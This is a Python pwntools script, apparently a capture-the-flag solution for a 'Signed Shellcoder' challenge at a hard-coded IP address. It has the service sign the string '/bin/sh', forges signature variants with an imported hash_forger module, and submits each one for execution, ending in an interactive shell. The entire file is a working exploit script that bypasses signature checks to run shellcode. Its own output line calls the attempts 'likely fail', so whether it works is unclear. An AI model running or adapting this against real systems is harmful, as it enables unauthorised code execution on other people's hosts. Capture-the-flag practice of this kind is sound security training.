#!/usr/bin/env python3

from pwn import *
from hash_forger import *

main_menu = b'Signed Shellcoder\n+------------------------------+\n| 1. Generate Signed Shellcode |\n| 2. Execute Signed Shellcode  |\n| 3. View Source Code          |\n| 4. Exit                      |\n+------------------------------+\nYour option: '
ask_for_message = b'Give me your favorite message: '
ask_for_register = b'Give me your favorite register: '
ask_for_shellcode = b'Give me your signed shellcode: '
bad_code_phase_1 = b'Invalid format or signature\n+------------------------------+\n| 1. Generate Signed Shellcode |\n'
bad_code_phase_2 = b'| 2. Execute Signed Shellcode  |\n| 3. View Source Code          |\n| 4. Exit                      |\n+------------------------------+\n'
r = remote('111.186.57.85', 30800)

r.recvuntil(main_menu)
r.sendline('1')

r.recvuntil(ask_for_message)
r.sendline('/bin/sh')

r.recvuntil(ask_for_register)
r.sendline('rcx')

shellc = r.recv()

shell_code = shellc.decode().splitlines()[0][26:]

forged = generate_forged(shell_code)

for body in forged:
    r.sendline('2')
    r.recvuntil(ask_for_shellcode)
    r.sendline(body)
    r.recvuntil(bad_code_phase_1)
    r.recvuntil(bad_code_phase_2)
    print('tried body', body, 'but likely fail')

r.interactive()
